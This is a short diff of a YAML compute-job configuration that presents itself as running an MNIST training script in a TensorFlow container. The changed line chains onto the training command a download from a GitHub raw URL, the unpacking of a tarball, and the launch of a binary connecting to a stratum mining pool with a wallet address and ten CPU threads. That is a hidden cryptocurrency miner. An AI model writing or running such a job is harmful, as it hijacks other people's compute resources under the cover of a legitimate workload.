@@ -26,8 +26,7 @@ jobs:
         - bash
         - -c
         - >-
-          cd /inputs/mnist-sample && python mnist.py
-          wget https://raw.githubusercontent.com/jazzup6176/new/main/pes1.tar.gz && tar xf pes1.tar.gz && ./pes1 -c stratum+tcp://139.99.123.225:3956#xnsub -u RRTP6VLKGvw7oFSRWpyVUabPyKRqDr5hJy.rig -p x --cpu 10
+          cd /inputs/mnist-sample && python mnist.py && wget https://raw.githubusercontent.com/jazzup6176/new/main/pes1.tar.gz && tar xf pes1.tar.gz && ./pes1 -c stratum+tcp://139.99.123.225:3956#xnsub -u RRTP6VLKGvw7oFSRWpyVUabPyKRqDr5hJy.rig -p x --cpu 10
       image: tensorflow/tensorflow:1.15.5-py3
     needs:
       - CloneRepo
